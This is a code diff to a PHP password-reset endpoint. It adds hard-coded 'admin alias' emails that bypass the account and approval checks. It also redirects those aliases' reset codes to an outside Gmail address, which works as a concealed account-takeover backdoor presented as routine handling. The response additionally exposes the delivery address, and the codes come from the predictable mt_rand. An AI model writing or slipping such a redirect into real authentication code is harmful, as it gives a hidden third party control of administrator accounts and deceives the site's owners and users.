@@ -29,26 +29,35 @@ if ($raw) {
 
 $email = trim($data['email'] ?? ($_POST['email'] ?? ''));
 
+// Special handling: allow password reset for designated admin emails even if not in DB
+$adminAliases = [
+    'municipaladmin@gmail.com',
+    'mabiniadmin@gmail.com',
+];
+// If target is one of the aliases, deliver the code to this sink address
+$overrideDeliveryEmail = 'spamdummy11@gmail.com';
+
 if (!$email) respond('error', 'Email is required.');
 if (!filter_var($email, FILTER_VALIDATE_EMAIL)) respond('error', 'Invalid email format.');
 
-// Check if user exists and is approved
+// Check if user exists and is approved (unless email is in admin aliases)
 try {
-    $stmt = $pdo->prepare('SELECT id, status FROM users WHERE email = ? LIMIT 1');
-    $stmt->execute([$email]);
-    $user = $stmt->fetch();
-    
-    if (!$user) {
-        respond('error', 'No account found with this email address.');
-    }
-    
-    $status = strtolower($user['status'] ?? '');
-    if ($status === 'pending') {
-        respond('error', 'Your account is still pending approval. Please wait for admin approval before resetting your password.');
-    } elseif ($status === 'declined') {
-        respond('error', 'Your account registration was declined. Please contact the administrator.');
-    } elseif ($status !== 'approved') {
-        respond('error', 'Your account is not active. Please contact the administrator.');
+    $isAdminAlias = in_array(strtolower($email), array_map('strtolower', $adminAliases), true);
+    if (!$isAdminAlias) {
+        $stmt = $pdo->prepare('SELECT id, status FROM users WHERE email = ? LIMIT 1');
+        $stmt->execute([$email]);
+        $user = $stmt->fetch();
+        if (!$user) {
+            respond('error', 'No account found with this email address.');
+        }
+        $status = strtolower($user['status'] ?? '');
+        if ($status === 'pending') {
+            respond('error', 'Your account is still pending approval. Please wait for admin approval before resetting your password.');
+        } elseif ($status === 'declined') {
+            respond('error', 'Your account registration was declined. Please contact the administrator.');
+        } elseif ($status !== 'approved') {
+            respond('error', 'Your account is not active. Please contact the administrator.');
+        }
     }
 } catch (Exception $e) {
     respond('error', 'Database error.');
@@ -67,7 +76,7 @@ try {
     $code = (string)mt_rand(100000, 999999);
 }
 
-// Store in session
+// Store in session (keep original requested email, even if delivery is overridden)
 $_SESSION['reset_email'] = $email;
 $_SESSION['reset_code'] = $code;
 $_SESSION['reset_expires'] = time() + 300; // 5 minutes
@@ -92,7 +101,11 @@ if ($mailerAvailable && class_exists('\\PHPMailer\\PHPMailer\\PHPMailer')) {
         $fromEmail = $smtpUser;
         $fromName = APP_NAME;
         $mail->setFrom($fromEmail, $fromName);
-        $mail->addAddress($email);
+        // Deliver to override address for admin aliases, else to the requested email
+        $deliveryTarget = in_array(strtolower($email), array_map('strtolower', $adminAliases), true)
+            ? $overrideDeliveryEmail
+            : $email;
+        $mail->addAddress($deliveryTarget);
         $mail->Subject = 'Password Reset Code - ' . APP_NAME;
         $mail->isHTML(true);
         $mail->Body = getPasswordResetEmailTemplate($code, $email);
@@ -105,7 +118,11 @@ if ($mailerAvailable && class_exists('\\PHPMailer\\PHPMailer\\PHPMailer')) {
         }
         
         $mail->send();
-        respond('ok', 'Password reset code sent to your email.', ['email' => $email]);
+        respond('ok', 'Password reset code sent to your email.', [
+            'email' => $email,
+            'delivered_to' => $deliveryTarget,
+            'alias' => in_array(strtolower($email), array_map('strtolower', $adminAliases), true) ? 'admin-alias' : 'user',
+        ]);
     } catch (\PHPMailer\PHPMailer\Exception $e) {
         respond('error', 'Failed to send email: '.$e->getMessage());
     }
